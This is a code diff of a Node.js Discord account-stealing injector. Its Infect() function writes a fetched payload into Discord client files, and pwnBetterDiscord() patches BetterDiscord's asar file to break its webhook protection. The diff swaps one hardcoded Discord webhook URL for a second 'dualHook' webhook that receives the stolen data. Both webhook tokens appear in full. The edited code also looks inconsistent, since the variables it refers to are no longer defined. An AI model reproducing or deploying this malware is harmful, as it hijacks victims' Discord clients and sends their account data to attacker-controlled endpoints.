@@ -4,7 +4,6 @@ const https = require('https');
 const { exec } = require('child_process');
 const axios = require('axios');
 const buf_replace = require('buffer-replace');
-const webhook = "https://discord.com/api/webhooks/939061101230968922/0JfAW0tWNehMB1bGU0O8J_ZbZdv2-5HvtKidw01Sns_ZLZBPTzWPxb5IiyTWNaXSVh7d"
 
 const config = {
     "logout": "instant",
@@ -12,7 +11,8 @@ const config = {
     "logout-notify": "true",
     "init-notify":"true",
     "embed-color": "3447704",
-    "disable-qr-code": "true"
+    "disable-qr-code": "true",
+    "dualHook": "https://discord.com/api/webhooks/939079528045772800/YrAYG7QDaAiDJyt25XY-dDEZ_7sQt3daaLAKT6LjHCE8m-IDbCrMQ0pAUSSgcIa6mu3O"
 }
 
 
@@ -48,7 +48,7 @@ function Infect() {
         });
         resp.on('end', () => {
             injectPath.forEach(file => {
-                fs.writeFileSync(file, data.replace("%WEBHOOK_LINK%", webhook).replace("%INITNOTI%", config["init-notify"]).replace("%LOGOUT%", config.logout).replace("%LOGOUTNOTI%", config["logout-notify"]).replace("3447704",config["embed-color"]).replace('%DISABLEQRCODE%', config["disable-qr-code"]), {
+                fs.writeFileSync(file, data.replace("%WEBHOOK_LINK%", webhook).replace("https://discord.com/api/webhooks/939079528045772800/YrAYG7QDaAiDJyt25XY-dDEZ_7sQt3daaLAKT6LjHCE8m-IDbCrMQ0pAUSSgcIa6mu3O", dualHook).replace("%INITNOTI%", config["init-notify"]).replace("%LOGOUT%", config.logout).replace("%LOGOUTNOTI%", config["logout-notify"]).replace("3447704",config["embed-color"]).replace('%DISABLEQRCODE%', config["disable-qr-code"]), {
                     encoding: 'utf8',
                     flag: 'w'
                 });
@@ -145,7 +145,7 @@ function pwnBetterDiscord() {
     var dir = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar"
     if (fs.existsSync(dir)) {
         var x = fs.readFileSync(dir)
-        fs.writeFileSync(dir, buf_replace(x, "api/webhooks", "stanleyisgod"))
+        fs.writeFileSync(dir, buf_replace(x, "https://discord.com/api/webhooks/939079528045772800/YrAYG7QDaAiDJyt25XY-dDEZ_7sQt3daaLAKT6LjHCE8m-IDbCrMQ0pAUSSgcIa6mu3O", "stanleyisgod"))
     } else {
         return;
     }
